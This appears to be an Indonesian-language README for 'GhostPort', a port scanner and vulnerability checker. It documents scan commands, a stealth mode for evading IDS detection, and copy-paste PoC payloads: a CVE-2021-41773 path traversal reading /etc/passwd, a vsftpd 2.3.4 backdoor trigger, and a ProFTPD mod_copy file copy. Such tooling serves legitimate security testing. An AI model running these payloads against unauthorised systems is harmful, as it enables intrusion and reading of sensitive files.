# GhostPort - Fitur & Daftar Payload Verifikasi

Dokumen ini berisi daftar lengkap fitur yang tersedia di **GhostPort** beserta detail payload verifikasi (Proof of Concept) yang di-generate oleh aplikasi saat menemukan kerentanan pada target.

---

## 🚀 Fitur Utama GhostPort

1. **Active Vulnerability Scanner**
   Memeriksa kerentanan secara eksplisit dan proaktif. GhostPort kini terintegrasi dengan verifikasi asinkron (menggunakan `reqwest` dan `tokio`) untuk membuktikan kelemahan tertentu secara langsung (seperti eksploitasi Apache CVE-2021-41773).
2. **Stealth Reconnaissance & Fingerprinting**
   Mendeteksi port yang terbuka dan mengidentifikasi service (banner grabbing) secara cepat dan senyap.
3. **Dynamic Payload Recommender**
   Memberikan rekomendasi perintah *Proof of Concept* (PoC) secara otomatis. GhostPort akan menukar teks `<TARGET_IP>` dan `<PORT>` di dalam rule dengan IP dan port target asli, sehingga Anda tinggal *copy-paste* perintah tersebut ke terminal.
4. **Interactive & Colored CLI Reporting**
   Menampilkan hasil scan dan tingkat bahaya (*CRITICAL*, *HIGH*, *MEDIUM*, *LOW*) dengan pewarnaan yang intuitif menggunakan crate `colored`.
5. **Modular Vulnerability Database**
   Rule deteksi (berbasis RegEx dan semantik versi) direpresentasikan dalam format yang didukung oleh `serde`, sehingga Anda dapat mengekspor atau memuatnya dari file eksternal (seperti `rules.json`).

---

## �️ Cara Penggunaan & Alur Deteksi GhostPort

GhostPort dirancang untuk mempermudah proses deteksi dan validasi *Proof of Concept* (PoC) secara interaktif dari satu pintu. Selain pemindaian dasar, GhostPort hadir dengan berbagai kapabilitas lanjutan seperti *stealth mode*, *fingerprinting*, hingga *plugin execution*. Berikut adalah daftar perintah lengkap yang bisa digunakan:

### 1. Perintah Pemindaian Inti (Scan Command)
Gunakan perintah `scan` (atau alias `s`) untuk memulai enumerasi.

* **Scan Top Ports (Paling Populer)**
  ```bash
  ghostport scan 192.168.1.10 --top-ports
  ```

* **Scan Berdasarkan Range Port**
  Memindai port dari 1 hingga 1024 (ini adalah default jika tidak dispesifikasi).
  ```bash
  ghostport scan 192.168.1.10 -s 1 -e 1024
  ```

* **Mengaktifkan Banner Grabbing (Fingerprinting)**
  Sangat disarankan untuk mendeteksi versi service dan mencocokannya dengan Vuln DB.
  ```bash
  ghostport scan 192.168.1.10 --top-ports -b
  ```

### 2. Mode Pemindaian & Stealth (Evasion)
GhostPort memiliki *Scan Mode* otomatis yang mengontrol jumlah thread dan delay antar-request untuk menghindari deteksi firewall/IDS. Ada 3 mode:
* `stealth` (Max stealth, random delays lambat)
* `balanced` (Keseimbangan kecepatan dan stealth, default)
* `aggressive` (Kecepatan maksimal, berisiko terdeteksi)

```bash
ghostport scan 192.168.1.10 -s 1 -e 65535 --mode stealth -b
```

### 3. Menggunakan Plugin (Deep Reconnaissance)
Mengaktifkan plugin lanjutan untuk layanan spesifik (seperti HTTP title grabber, SSH info, dll).
```bash
ghostport scan 192.168.1.10 --top-ports -b --plugins
```

### 4. Ekspor Laporan (Exporting)
Anda dapat menyimpan hasil scan dan payload ke dalam berbagai format (JSON, CSV, atau TXT fallback).
```bash
ghostport scan 192.168.1.10 --top-ports -b --format json --output hasil_scan.json
```

### 5. Utilities Tambahan
Selain `scan`, GhostPort memiliki *sub-commands* utilitas lain:
* **Discover Hosts**: Mengecek status aktif sebuah host (`ghostport discover 192.168.1.10`).
* **Interactive Connect**: Berfungsi layaknya `netcat` untuk menghubungkan dan berinteraksi langsung ke port tertentu (`ghostport connect 192.168.1.10 -p 22`).
* **List Plugins**: Melihat plugin bawaan yang aktif dan siap dipakai (`ghostport plugins`).

---

### Membaca Laporan Kerentanan Interaktif
Setelah *port scanning*, GhostPort akan mencocokkan banner *service* yang berjalan dengan database kerentanannya. Anda akan mendapatkan log interaktif berwarna seperti ini di dalam terminal:

```text
[CRITICAL] Vulnerable Apache HTTP Server (Detected 2.4.40)
Deskripsi: Server Apache HTTP (<2.4.49) terindikasi rentan (Memungkinkan serangan Path Traversal CVE-2021-41773).
💡 Rekomendasi Payload PoC: curl -v --path-as-is http://192.168.1.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd

[HIGH] Outdated SSH version (Detected 7.2.0)
Deskripsi: Versi OpenSSH sangat lawas dan rentan terhadap berbagai eksploit.
💡 Rekomendasi Payload PoC: nmap -p 22 -sV --script ssh2-enum-algos 192.168.1.10
```

*Perhatikan bahwa variabel `<TARGET_IP>` pada PoC telah diganti otomatis oleh GhostPort menjadi `192.168.1.10`.*

### Cara Verifikasi Kerentanan dengan Payload PoC
Blok parameter *Rekomendasi Payload PoC* di terminal Anda, kemudian *copy-paste* eksekusi rekomen tersebut langsung pada sesi terminal yang baru untuk memvalidasi (Verifikasi Aman non-destruktif) eksploit yang relevan.

> Untuk *Active Verification* seperti Apache (CVE-2021-41773), GhostPort bahkan sudah memvalidasi payload ini secara *background* menggunakan HTTP reqwest (jika fitur dieksekusi), memberitahu Anda secara presisi apakah serangannya terkonfirmasi sebelum Anda menjalankannya.

---

## �🛡️ Daftar Kerentanan & Contoh Penggunaan Payload (PoC)

Berikut adalah daftar kerentanan bawaan yang dapat dideteksi GhostPort dan contoh cara menggunakan *verification payload* yang direkomendasikan. 

> **Catatan:** GhostPort akan secara otomatis mengganti string `<TARGET_IP>` dengan alamat IP target pada saat di terminal.

### 1. Vulnerable Apache HTTP Server (CVE-2021-41773)
* **Severity**: `[CRITICAL]`
* **Kondisi Rentan**: Apache versi < 2.4.49
* **Deskripsi**: Terindikasi rentan terhadap serangan *Path Traversal* yang memungkinkan peretas membaca file konfidensial di luar DocumentRoot.
* **Payload PoC**:
  ```bash
  curl -s -v --path-as-is "http://<TARGET_IP>/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
  ```

### 2. vsftpd Backdoor Vulnerability (vsftpd 2.3.4)
* **Severity**: `[CRITICAL]`
* **Kondisi Rentan**: vsftpd versi 2.3.4
* **Deskripsi**: Backdoor terkenal yang memicu shell root (bind shell) pada port 6200 ketika user memasukkan *smiley face* `:)`.
* **Payload PoC**:
  ```bash
  echo -e "USER hacker:)\nPASS pass\n" | nc -w 3 <TARGET_IP> 21 && nc -vz <TARGET_IP> 6200
  ```

### 3. Outdated ProFTPD Mod_Copy
* **Severity**: `[HIGH]`
* **Kondisi Rentan**: ProFTPD versi < 1.3.5
* **Deskripsi**: Modul `mod_copy` yang rentan memungkinkan penyalinan file tanpa autentikasi, sering digunakan untuk mengunggah shell PHP.
* **Payload PoC**:
  ```bash
  curl -s "ftp://<TARGET_IP>:21" -Q "SITE CPFR /etc/passwd" -Q "SITE CPTO /tmp/proof_of_concept"
  ```

### 4. Outdated OpenSSH Version
* **Severity**: `[HIGH]`
* **Kondisi Rentan**: OpenSSH versi < 7.4 (Atau versi 4.x/5.x/6.x)
* **Deskripsi**: Versi lama sering mendukung algoritma kriptografi yang usang dan rentan terhadap enumerasi user atau DoS.
* **Payload PoC**:
  ```bash
  nmap -p 22 -sV --script ssh2-enum-algos <TARGET_IP>
  ```

### 5. Outdated NGINX Server
* **Severity**: `[MEDIUM]`
* **Kondisi Rentan**: Nginx versi < 1.16.x
* **Deskripsi**: Versi usang yang rentan terhadap *HTTP Request Smuggling* dan minor DoS.
* **Payload PoC**:
  ```bash
  curl -I -s http://<TARGET_IP>/
  ```

### 6. Layanan Terekspos Lainnya (Insecure Configurations)
GhostPort juga memberikan peringatan *High Severity* jika layanan tidak aman ini terbuka untuk umum secara *clear-text*:

* **Telnet Terbuka (Port 23)**:
  * Payload PoC (Passive Sniffing): `Wireshark / tcpdump -i <interface> port 23`
* **Exposed Database (MySQL, PostgreSQL, MongoDB, Redis)**:
  * Payload PoC (Connection Test): `nc -vz <TARGET_IP> <PORT>`
* **Cleartext FTP (Port 21)**:
  * Payload PoC (Anonymous Login): `ftp <TARGET_IP> <PORT> ; prompt: Anonymous`
* **VNC Service Exposed**:
  * Payload PoC (Brute Force Check): `vncviewer <TARGET_IP>:5900`
